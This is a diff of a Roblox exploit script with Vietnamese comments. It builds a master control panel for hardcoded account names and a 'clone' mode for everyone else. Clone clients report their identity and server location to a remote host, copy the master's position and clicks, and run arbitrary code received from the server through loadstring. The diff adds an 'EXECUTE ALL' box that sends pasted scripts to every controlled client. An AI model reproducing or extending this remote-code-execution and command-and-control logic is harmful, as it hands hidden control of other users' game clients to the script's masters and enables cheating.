@@ -4,7 +4,7 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LP = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
-local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 
 local MASTERS = {["huynesoi"] = true, ["soicon19911"] = true}
 local isMaster = MASTERS[LP.Name] or false
@@ -12,7 +12,7 @@ local isMaster = MASTERS[LP.Name] or false
 local selectedLead = nil
 local selectedFollowers = {}
 local currentViewing = nil
-local isPossessing = false
+local isControlling = false
 
 local function Post(path, data)
     local suc, res = pcall(function()
@@ -33,15 +33,15 @@ end
 if isMaster then
     local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
     local main = Instance.new("Frame", sg)
-    main.Size = UDim2.new(0, 650, 0, 450)
-    main.Position = UDim2.new(0.5, -325, 0.5, -225)
+    main.Size = UDim2.new(0, 650, 0, 480)
+    main.Position = UDim2.new(0.5, -325, 0.5, -240)
     main.BackgroundColor3 = Color3.fromHex("#1E1F22")
     main.Active = true
     main.Draggable = true
-    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 8)
+    Instance.new("UICorner", main)
 
     local leftPanel = Instance.new("Frame", main)
-    leftPanel.Size = UDim2.new(0.35, 0, 1, -120)
+    leftPanel.Size = UDim2.new(0.35, 0, 1, -20)
     leftPanel.Position = UDim2.new(0, 10, 0, 10)
     leftPanel.BackgroundColor3 = Color3.fromHex("#2B2D31")
     Instance.new("UICorner", leftPanel)
@@ -51,87 +51,84 @@ if isMaster then
     scroll.Position = UDim2.new(0, 5, 0, 5)
     scroll.BackgroundTransparency = 1
     scroll.BorderSizePixel = 0
-    local layout = Instance.new("UIListLayout", scroll)
-    layout.Padding = UDim.new(0, 8)
+    Instance.new("UIListLayout", scroll).Padding = UDim.new(0, 8)
 
     local rightPanel = Instance.new("Frame", main)
-    rightPanel.Size = UDim2.new(0.65, -30, 1, -120)
+    rightPanel.Size = UDim2.new(0.65, -30, 1, -20)
     rightPanel.Position = UDim2.new(0.35, 20, 0, 10)
     rightPanel.BackgroundColor3 = Color3.fromHex("#2B2D31")
     Instance.new("UICorner", rightPanel)
 
     local avatarImg = Instance.new("ImageLabel", rightPanel)
-    avatarImg.Size = UDim2.new(0, 100, 0, 100)
-    avatarImg.Position = UDim2.new(0, 15, 0, 15)
+    avatarImg.Size = UDim2.new(0, 80, 0, 80)
+    avatarImg.Position = UDim2.new(0, 10, 0, 10)
     avatarImg.BackgroundColor3 = Color3.fromHex("#1E1F22")
     Instance.new("UICorner", avatarImg)
 
     local dInfo = Instance.new("TextLabel", rightPanel)
-    dInfo.Size = UDim2.new(1, -140, 0, 100)
-    dInfo.Position = UDim2.new(0, 130, 0, 15)
+    dInfo.Size = UDim2.new(1, -110, 0, 80)
+    dInfo.Position = UDim2.new(0, 100, 0, 10)
     dInfo.BackgroundTransparency = 1
     dInfo.TextColor3 = Color3.new(1,1,1)
     dInfo.TextXAlignment = Enum.TextXAlignment.Left
-    dInfo.TextYAlignment = Enum.TextYAlignment.Top
-    dInfo.TextSize = 14
     dInfo.RichText = true
 
+    local dJoin = Instance.new("TextButton", rightPanel)
+    dJoin.Size = UDim2.new(0.9, 0, 0, 30)
+    dJoin.Position = UDim2.new(0.05, 0, 0, 100)
+    dJoin.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    dJoin.TextColor3 = Color3.new(1,1,1)
+    dJoin.Text = "JOIN SERVER"
+    local sJoin = Instance.new("UIStroke", dJoin) sJoin.Color = Color3.new(1,1,1)
+    Instance.new("UICorner", dJoin)
+
     local dControl = Instance.new("TextButton", rightPanel)
-    dControl.Size = UDim2.new(0.42, 0, 0, 45)
-    dControl.Position = UDim2.new(0.05, 0, 0, 135)
+    dControl.Size = UDim2.new(0.42, 0, 0, 40)
+    dControl.Position = UDim2.new(0.05, 0, 0, 140)
     dControl.BackgroundColor3 = Color3.fromRGB(255,255,0)
-    dControl.TextColor3 = Color3.new(0,0,0)
     dControl.Text = "SELECT LEAD"
-    dControl.Font = Enum.Font.GothamBold
     Instance.new("UICorner", dControl)
 
     local dSync = Instance.new("TextButton", rightPanel)
-    dSync.Size = UDim2.new(0.42, 0, 0, 45)
-    dSync.Position = UDim2.new(0.53, 0, 0, 135)
+    dSync.Size = UDim2.new(0.42, 0, 0, 40)
+    dSync.Position = UDim2.new(0.53, 0, 0, 140)
     dSync.BackgroundColor3 = Color3.fromRGB(0,255,0)
-    dSync.TextColor3 = Color3.new(0,0,0)
     dSync.Text = "ADD SLAVE"
-    dSync.Font = Enum.Font.GothamBold
     Instance.new("UICorner", dSync)
 
-    local bottomPanel = Instance.new("Frame", main)
-    bottomPanel.Size = UDim2.new(1, -20, 0, 90)
-    bottomPanel.Position = UDim2.new(0, 10, 1, -100)
-    bottomPanel.BackgroundColor3 = Color3.fromHex("#2B2D31")
-    Instance.new("UICorner", bottomPanel)
+    local eInput = Instance.new("TextBox", rightPanel)
+    eInput.Size = UDim2.new(0.9, 0, 0, 60)
+    eInput.Position = UDim2.new(0.05, 0, 0, 190)
+    eInput.BackgroundColor3 = Color3.fromHex("#1E1F22")
+    eInput.TextColor3 = Color3.new(1,1,1)
+    eInput.PlaceholderText = "Paste script here..."
+    Instance.new("UICorner", eInput)
 
-    local startControlBtn = Instance.new("TextButton", bottomPanel)
-    startControlBtn.Size = UDim2.new(0.48, 0, 0, 35)
-    startControlBtn.Position = UDim2.new(0, 10, 0, 10)
-    startControlBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
-    startControlBtn.TextColor3 = Color3.new(0,0,0)
-    startControlBtn.Text = "START CONTROL"
-    startControlBtn.Font = Enum.Font.GothamBold
-    Instance.new("UICorner", startControlBtn)
+    local eRun = Instance.new("TextButton", rightPanel)
+    eRun.Size = UDim2.new(0.9, 0, 0, 30)
+    eRun.Position = UDim2.new(0.05, 0, 0, 260)
+    eRun.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+    eRun.Text = "EXECUTE ALL"
+    Instance.new("UICorner", eRun)
 
-    local syncSlavesBtn = Instance.new("TextButton", bottomPanel)
-    syncSlavesBtn.Size = UDim2.new(0.48, 0, 0, 35)
-    syncSlavesBtn.Position = UDim2.new(0.5, 5, 0, 10)
-    syncSlavesBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-    syncSlavesBtn.TextColor3 = Color3.new(0,0,0)
-    syncSlavesBtn.Text = "SYNC SLAVES"
-    syncSlavesBtn.Font = Enum.Font.GothamBold
-    Instance.new("UICorner", syncSlavesBtn)
+    local startBtn = Instance.new("TextButton", rightPanel)
+    startBtn.Size = UDim2.new(0.9, 0, 0, 40)
+    startBtn.Position = UDim2.new(0.05, 0, 0, 300)
+    startBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
+    startBtn.Text = "START MASTER CONTROL"
+    Instance.new("UICorner", startBtn)
 
-    local cancelBtn = Instance.new("TextButton", bottomPanel)
-    cancelBtn.Size = UDim2.new(0.97, 0, 0, 30)
-    cancelBtn.Position = UDim2.new(0, 10, 0, 50)
+    local cancelBtn = Instance.new("TextButton", rightPanel)
+    cancelBtn.Size = UDim2.new(0.9, 0, 0, 40)
+    cancelBtn.Position = UDim2.new(0.05, 0, 0, 350)
     cancelBtn.BackgroundColor3 = Color3.fromRGB(240, 71, 71)
-    cancelBtn.TextColor3 = Color3.new(1,1,1)
-    cancelBtn.Text = "STOP ALL & REVEAL"
-    cancelBtn.Font = Enum.Font.GothamBold
+    cancelBtn.Text = "STOP CONTROL"
     Instance.new("UICorner", cancelBtn)
 
     local function updateList()
         local users = Post("/list", {})
         if not users then return end
         for _, v in pairs(scroll:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
-        
         for _, u in ipairs(users) do
             local b = Instance.new("TextButton", scroll)
             b.Size = UDim2.new(1, 0, 0, 45)
@@ -140,124 +137,107 @@ if isMaster then
             b.Text = "      " .. u.name
             b.TextXAlignment = Enum.TextXAlignment.Left
             Instance.new("UICorner", b)
+            local s = Instance.new("UIStroke", b) s.Color = Color3.new(1,1,1)
+            local icon = Instance.new("ImageLabel", b)
+            icon.Size = UDim2.new(0, 35, 0, 35)
+            icon.Position = UDim2.new(0, 5, 0.5, -17)
+            icon.Image = "rbxthumb://type=AvatarHeadShot&id="..u.id.."&w=150&h=150"
+            Instance.new("UICorner", icon).CornerRadius = UDim.new(1,0)
 
-            local stroke = Instance.new("UIStroke", b)
-            stroke.Color = Color3.new(1,1,1)
-            stroke.Thickness = 1.5
-            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-
-            local btnIcon = Instance.new("ImageLabel", b)
-            btnIcon.Size = UDim2.new(0, 35, 0, 35)
-            btnIcon.Position = UDim2.new(0, 5, 0.5, -17)
-            btnIcon.Image = "rbxthumb://type=AvatarHeadShot&id="..u.id.."&w=150&h=150"
-            Instance.new("UICorner", btnIcon).CornerRadius = UDim.new(1,0)
-
-            if selectedLead == u.name then
-                b.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
-                b.TextColor3 = Color3.new(0,0,0)
-            elseif selectedFollowers[u.name] then
-                b.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-                b.TextColor3 = Color3.new(0,0,0)
-            end
+            if selectedLead == u.name then b.BackgroundColor3 = Color3.fromRGB(255, 255, 0) b.TextColor3 = Color3.new(0,0,0)
+            elseif selectedFollowers[u.name] then b.BackgroundColor3 = Color3.fromRGB(0, 255, 0) b.TextColor3 = Color3.new(0,0,0) end
 
             b.MouseButton1Click:Connect(function()
                 currentViewing = u
                 avatarImg.Image = "rbxthumb://type=AvatarHeadShot&id="..u.id.."&w=420&h=420"
-                dInfo.Text = string.format("<b>NAME:</b> %s\n<b>ID:</b> %d\n<b>UPTIME:</b> %ds", u.name, u.id, u.uptime)
+                dInfo.Text = string.format("<b>Name:</b> %s\n<b>ID:</b> %d", u.name, u.id)
             end)
         end
     end
 
+    dJoin.MouseButton1Click:Connect(function() if currentViewing then TeleportService:TeleportToPlaceInstance(currentViewing.placeId, currentViewing.jobId, LP) end end)
     dControl.MouseButton1Click:Connect(function() if currentViewing then selectedLead = currentViewing.name updateList() end end)
     dSync.MouseButton1Click:Connect(function() if currentViewing then selectedFollowers[currentViewing.name] = true updateList() end end)
 
-    startControlBtn.MouseButton1Click:Connect(function()
+    startBtn.MouseButton1Click:Connect(function()
         if not selectedLead then return end
-        isPossessing = true
-        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        isControlling = true
         
+        -- Lấy CFrame Lead 1 lần duy nhất
+        local target = Players:FindFirstChild(selectedLead)
+        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+            LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+        end
+        
+        -- Mở Backpack & Gui
+        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+
         task.spawn(function()
-            while isPossessing and task.wait() do
-                local target = Players:FindFirstChild(selectedLead)
-                if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-                    if LP.Character then
-                        for _, p in pairs(LP.Character:GetDescendants()) do
-                            if p:IsA("BasePart") then p.Transparency = 1 p.CanCollide = false end
-                        end
-                        LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
-                    end
-                end
+            while isControlling and task.wait(0.1) do
+                local root = LP.Character.HumanoidRootPart
+                local cf = root.CFrame
+                Post("/send_master_pos", {
+                    x = cf.X, y = cf.Y, z = cf.Z, 
+                    rx = cf.LookVector.X, ry = cf.LookVector.Y, rz = cf.LookVector.Z,
+                    jump = (LP.Character.Humanoid.Jump)
+                })
             end
         end)
     end)
 
-    syncSlavesBtn.MouseButton1Click:Connect(function()
-        if selectedLead then
-            for fName, _ in pairs(selectedFollowers) do
-                Post("/send_cmd", {target = fName, type = "sync_to", data = selectedLead})
+    UserInputService.InputBegan:Connect(function(input, gpe)
+        if isControlling and not gpe then
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                if selectedLead then Post("/send_cmd", {target = selectedLead, type = "click"}) end
+                for fName, _ in pairs(selectedFollowers) do Post("/send_cmd", {target = fName, type = "click"}) end
             end
         end
     end)
 
     cancelBtn.MouseButton1Click:Connect(function()
-        isPossessing = false
-        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
-        if LP.Character then
-            for _, p in pairs(LP.Character:GetDescendants()) do if p:IsA("BasePart") then p.Transparency = 0 end end
-        end
-        for fName, _ in pairs(selectedFollowers) do Post("/send_cmd", {target = fName, type = "stop_sync", data = ""}) end
-        selectedLead = nil
-        selectedFollowers = {}
-        updateList()
+        isControlling = false
+        selectedLead = nil; selectedFollowers = {}; updateList()
     end)
 
     task.spawn(function() while task.wait(3) do updateList() end end)
 
 else
+    -- PHẦN CLONE (SLAVE & LEAD)
     local slaveGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
-    local sFrame = Instance.new("Frame", slaveGui)
-    sFrame.Size = UDim2.new(0, 200, 0, 80)
-    sFrame.Position = UDim2.new(0.5, -100, 0.5, -40)
-    sFrame.BackgroundColor3 = Color3.fromHex("#1E1F22")
-    sFrame.Active = true
-    sFrame.Draggable = true
-    Instance.new("UICorner", sFrame)
-    
-    local sBtn = Instance.new("TextButton", sFrame)
-    sBtn.Size = UDim2.new(1, -20, 1, -20)
-    sBtn.Position = UDim2.new(0, 10, 0, 10)
-    sBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
-    sBtn.TextColor3 = Color3.new(1,1,1)
+    local sBtn = Instance.new("TextButton", slaveGui)
+    sBtn.Size = UDim2.new(0, 150, 0, 50)
+    sBtn.Position = UDim2.new(0.5, -75, 0, 10)
     sBtn.Text = "ACTIVATE CLONE"
     Instance.new("UICorner", sBtn)
 
     sBtn.MouseButton1Click:Connect(function()
         slaveGui:Destroy()
-        local startTime = os.time()
+        local startT = os.time()
         task.spawn(function()
-            while task.wait(3) do
-                Post("/update", {id = LP.UserId, name = LP.Name, jobId = game.JobId, placeId = game.PlaceId, uptime = os.time() - startTime})
-            end
+            while task.wait(3) do Post("/update", {id = LP.UserId, name = LP.Name, jobId = game.JobId, placeId = game.PlaceId, uptime = os.time()-startT}) end
         end)
-
-        local activeTarget = nil
+        
+        -- Loop nhận CFrame Master
         task.spawn(function()
-            while task.wait(1) do
-                local cmd = Post("/get_cmd", {name = LP.Name})
-                if cmd and cmd.type then
-                    if cmd.type == "sync_to" then activeTarget = cmd.data
-                    elseif cmd.type == "stop_sync" then activeTarget = nil
-                    elseif cmd.type == "execute" then local f = loadstring(cmd.data) if f then task.spawn(f) end end
+            while task.wait() do
+                local state = Post("/get_master_pos", {})
+                if state and state.x then
+                    LP.Character.HumanoidRootPart.CFrame = CFrame.new(state.x, state.y, state.z)
+                    if state.jump then LP.Character.Humanoid.Jump = true end
                 end
             end
         end)
 
+        -- Loop nhận Lệnh Click/Execute
         task.spawn(function()
-            while task.wait() do
-                if activeTarget then
-                    local t = Players:FindFirstChild(activeTarget)
-                    if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
-                        LP.Character.HumanoidRootPart.CFrame = t.Character.HumanoidRootPart.CFrame
+            while task.wait(0.5) do
+                local cmd = Post("/get_cmd", {name = LP.Name})
+                if cmd then
+                    if cmd.type == "click" then
+                        local tool = LP.Character:FindFirstChildOfClass("Tool")
+                        if tool then tool:Activate() end
+                    elseif cmd.type == "execute" then
+                        local f = loadstring(cmd.data) if f then task.spawn(f) end
                     end
                 end
             end
